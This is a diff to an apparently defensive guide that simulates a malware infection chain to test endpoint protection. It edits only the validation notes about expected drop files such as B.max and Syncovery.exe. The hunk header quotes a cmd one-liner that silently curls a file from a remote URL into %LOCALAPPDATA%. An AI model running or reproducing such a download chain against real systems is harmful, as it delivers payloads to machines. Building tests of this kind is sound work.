@@ -39,7 +39,7 @@ cmd /v:on /c "set "u=%LOCALAPPDATA%\B.max" && curl -s -k -L -o "!u!" "https://<m
 
 #### Validation
 
-To validate whether or not the "infection" succeeded, you should find the following files on your system. 
+To validate whether or not the "infection" succeeded, you should find the following files on your system. Note that the `B.max` file is automatically deleted by the "infection", so not finding that file is expected, but I am leaving that here as a validation check just in case the infection chain was broken by your Endpoint Protection suite..
 
 ```
 %LOCALAPPDATA%\B.max
@@ -48,7 +48,7 @@ To validate whether or not the "infection" succeeded, you should find the follow
 %USERPROFILE%\Documents\928252966059280400\Syncovery.exe
 ```
 
-If found, the "infection" succeeded, and your Endpoint Protection failed to prevent it.
+If the TXT, PDF, and EXE files are found, the "infection" succeeded, and your Endpoint Protection failed to prevent it.
 
 #### Clean-Up
 
